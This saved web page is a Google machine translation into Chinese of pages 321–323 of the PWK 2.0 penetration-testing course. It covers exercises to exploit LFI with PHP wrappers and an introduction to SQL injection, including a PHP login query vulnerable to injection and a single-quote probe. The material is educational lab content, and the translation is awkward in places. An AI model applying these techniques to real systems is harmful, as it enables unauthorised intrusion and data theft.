
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script src="./o3cp[321-441]_files/translate_c.js.下载"></script><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/o3cp[321-441].pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./o3cp[321-441]_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<title>9.4.5 SQL 注入</title>
<style type="text/css" abt="234"></style><link type="text/css" rel="stylesheet" charset="UTF-8" href="./o3cp[321-441]_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./o3cp[321-441]_files/main_zh-CN.js.下载"></script><script>//console.log('a')
</script><script>//remove baidu search ad
var _countAA = 0
function doBBBd(){}
doBBBd()
document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)

</script><script type="text/javascript" charset="UTF-8" src="./o3cp[321-441]_files/element_main.js.下载"></script><link rel="stylesheet" type="text/css" href="./o3cp[321-441]_files/iw_sprite.css"></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./o3cp[321-441]_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./o3cp[321-441]_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:1285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:1285;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:1285;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">321</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.9.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们提交这个，看看它是否有效：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:783;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 159：使用数据包装器利用 LFI</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">我们包含在数据包装器中的 PHP 代码在服务器端执行，生成一个</font></font></nobr></div>
<div style="position:absolute;top:834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录列表。</font><font style="vertical-align: inherit;">我们现在可以在不操作任何本地文件的情况下利用 LFI。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:868;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.10 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 PHP 包装器利用 LFI 漏洞。</font></font></nobr></div>
<div style="position:absolute;top:927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 PHP 包装器在您的 Windows 10 实验室机器上获取 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:961;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5 SQL 注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:999;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL 注入</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">282</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个常见的 Web 应用程序漏洞，由未经处理的用户输入引起</font></font></nobr></div>
<div style="position:absolute;top:1018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被插入到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">283中</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并随后传递到数据库以供执行。</font><font style="vertical-align: inherit;">查询是</font></font></nobr></div>
<div style="position:absolute;top:1037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于与数据库交互，例如插入或检索数据。</font><font style="vertical-align: inherit;">如果我们可以注入恶意</font></font></nobr></div>
<div style="position:absolute;top:1057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入到查询中，我们可以“打破”开发人员所做的原始查询并引入</font></font></nobr></div>
<div style="position:absolute;top:1076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们自己的恶意行为。</font></font></nobr></div>
<div style="position:absolute;top:1109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些类型的漏洞可能导致数据库信息泄漏，并且取决于</font></font></nobr></div>
<div style="position:absolute;top:1129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境，可能导致完全的服务器妥协。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:1215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">282 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/SQL_injection</font></font></font></nobr></div>
<div style="position:absolute;top:1235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">283 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/SQL_syntax#Queries</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:1363;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:1396;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:2473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:2473;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:2473;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">322</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将研究 PHP/MariaDB 环境下的 SQL 注入攻击。</font><font style="vertical-align: inherit;">虽然</font></font></nobr></div>
<div style="position:absolute;top:1511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他环境的概念相同，攻击期间使用的语法可能需要</font></font></nobr></div>
<div style="position:absolute;top:1530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新以适应不同的数据库引擎或脚本语言。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1593;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB 与 MySQL 非常相似。</font><font style="vertical-align: inherit;">事实上，它最初是 MySQL 的一个分支。</font><font style="vertical-align: inherit;">尽管</font></font></i></nobr></div>
<div style="position:absolute;top:1612;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一些细微差别，其中大部分与攻击者无关。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1674;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.1 基本 SQL 语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结构化查询语言 (SQL) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">284</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是用于与关系交互的主要语言</font></font></nobr></div>
<div style="position:absolute;top:1728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库。</font><font style="vertical-align: inherit;">虽然 SQL 有标准语法，但大多数数据库软件包都有</font></font></nobr></div>
<div style="position:absolute;top:1747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实施变化。</font><font style="vertical-align: inherit;">但是，基本原理通常是相同的。</font><font style="vertical-align: inherit;">让我们通过一些</font></font></nobr></div>
<div style="position:absolute;top:1766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本的 SQL 概念和语法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">285</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，以便在继续利用之前对其有所了解。</font></font></nobr></div>
<div style="position:absolute;top:1799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关系数据库由一个或多个表组成，每个表有一个或多个列。</font></font></nobr></div>
<div style="position:absolute;top:1819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表中的每个条目称为一行。</font><font style="vertical-align: inherit;">让我们看一个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+------------+--------------+</font></font></nobr></div>
<div style="position:absolute;top:1871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">身份证 | </font><font style="vertical-align: inherit;">用户名 | </font><font style="vertical-align: inherit;">密码 |</font></font></nobr></div>
<div style="position:absolute;top:1888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+------------+--------------+</font></font></nobr></div>
<div style="position:absolute;top:1904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1 | </font><font style="vertical-align: inherit;">汤姆琼斯| </font><font style="vertical-align: inherit;">不寻常 |</font></font></nobr></div>
<div style="position:absolute;top:1924;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 311 - 一个示例用户表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 311 中，列是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">username</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">password</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">有一行数据供用户使用</font></font></nobr></div>
<div style="position:absolute;top:1973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的用户名</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tom.jones</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和密码</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">notunusual</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:2006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数情况下，我们将处理</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">查询是对数据库引擎和</font></font></nobr></div>
<div style="position:absolute;top:2025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用它们来检索或操作数据库中的数据。</font><font style="vertical-align: inherit;">一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SELECT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询是最基本的</font></font></nobr></div>
<div style="position:absolute;top:2044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相互作用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SELECT * FROM 用户；</font></font></nobr></div>
<div style="position:absolute;top:2098;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 312 - 一个简单的选择查询</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将清单 312 中的查询解释为“向我显示</font><i><font style="vertical-align: inherit;">用户中的</font></i><font style="vertical-align: inherit;">所有列和记录</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:2147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌子”。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SELECT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的第一个参数</font><font style="vertical-align: inherit;">是一个列，星号是一个特殊的</font></font></nobr></div>
<div style="position:absolute;top:2166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符，表示“全部”。</font></font></nobr></div>
<div style="position:absolute;top:2199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以选择使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WHERE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句</font><font style="vertical-align: inherit;">在查询中引入条件</font><font style="vertical-align: inherit;">子句：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从用户中选择用户名 WHERE id=1;</font></font></nobr></div>
<div style="position:absolute;top:2253;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 313 - 带有 where 子句的选择查询</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将清单 313 中的查询解释为“向我显示</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">users</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表中</font><font style="vertical-align: inherit;">的</font><i><font style="vertical-align: inherit;">用户</font></i><font style="vertical-align: inherit;">名字段，</font></font></nobr></div>
<div style="position:absolute;top:2302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅显示</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为 1”的</font><font style="vertical-align: inherit;">记录</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:2403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">284 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/SQL</font></font></font></nobr></div>
<div style="position:absolute;top:2423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">285 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/SQL_syntax</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:2551;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:2584;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:3661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:3661;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:3661;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">323</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些只是一些基础知识。</font><font style="vertical-align: inherit;">我们还可以</font><font style="vertical-align: inherit;">在表中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:2699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会在这里介绍这些语句，但是当我们展示如何利用 SQL 注入时，我们将介绍</font></font></nobr></div>
<div style="position:absolute;top:2718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据需要附加 SQL 语法。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:2753;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.2 识别 SQL 注入漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们找到 SQL 注入漏洞之前，我们必须首先确定数据可能存在的位置</font></font></nobr></div>
<div style="position:absolute;top:2807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过数据库。</font><font style="vertical-align: inherit;">身份验证通常由数据库支持，具体取决于</font></font></nobr></div>
<div style="position:absolute;top:2826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序的性质，其他领域包括电子商务网站上的产品或消息</font></font></nobr></div>
<div style="position:absolute;top:2845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论坛上的话题通常需要数据库交互。</font></font></nobr></div>
<div style="position:absolute;top:2878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用单引号 (')，SQL 将其用作字符串分隔符，作为对潜在可能性的简单检查</font></font></nobr></div>
<div style="position:absolute;top:2898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL注入漏洞。</font><font style="vertical-align: inherit;">如果应用程序没有正确处理这个字符，它可能会</font></font></nobr></div>
<div style="position:absolute;top:2917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致数据库错误，并可能表明存在 SQL 注入漏洞。</font><font style="vertical-align: inherit;">知道了这一点，</font></font></nobr></div>
<div style="position:absolute;top:2936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们通常通过在我们怀疑可能通过的每个字段中输入单引号来开始我们的攻击</font></font></nobr></div>
<div style="position:absolute;top:2956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它的参数到数据库。</font><font style="vertical-align: inherit;">当</font><i><font style="vertical-align: inherit;">黑盒</font></i><font style="vertical-align: inherit;">出现时，我们将需要使用这种试错法</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:2975;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">286</font></font></font></nobr></div>
<div style="position:absolute;top:3008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们可以访问应用程序的源代码，我们可以查看它正在构建的 SQL 查询</font></font></nobr></div>
<div style="position:absolute;top:3027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串连接。</font><font style="vertical-align: inherit;">在 PHP 中，这可能类似于以下内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$query = "select * from users where username = '$user' and password = '$pass'";</font></font></nobr></div>
<div style="position:absolute;top:3081;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 314 - 带有 SQL 查询的示例 PHP 代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果用户数据包含在 SQL 语句中而没有以任何方式进行清理，则 SQL</font></font></nobr></div>
<div style="position:absolute;top:3130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注入发生率非常高。</font><font style="vertical-align: inherit;">让我们用一些例子进一步分解它。</font><font style="vertical-align: inherit;">在正常情况下</font></font></nobr></div>
<div style="position:absolute;top:3149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录，用户可能会提交“Tom”和“password123”作为他们的用户名和密码。</font><font style="vertical-align: inherit;">编码</font></font></nobr></div>
<div style="position:absolute;top:3169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此看起来像这样：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$query = "select * from users where username = ' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ' and password = ' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">password123</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> '";</font></font></nobr></div>
<div style="position:absolute;top:3223;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 315 - 正常登录的示例代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意提交的值是如何用单引号括起来的。</font><font style="vertical-align: inherit;">让我们来看看会发生什么</font></font></nobr></div>
<div style="position:absolute;top:3272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果单引号作为值提交：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$query = "select * from users where username =' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ' and password = 'password123' ";</font></font></nobr></div>
<div style="position:absolute;top:3326;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 316 - 带有 SQL 注入负载的示例代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于单引号用于分隔符，因此上述查询读取为空用户名，然后</font></font></nobr></div>
<div style="position:absolute;top:3375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“and password =”的错位字符串，造成语法错误。</font><font style="vertical-align: inherit;">如果 Web 应用程序显示错误</font></font></nobr></div>
<div style="position:absolute;top:3394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其页面中的消息，我们将收到类似于以下内容的输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
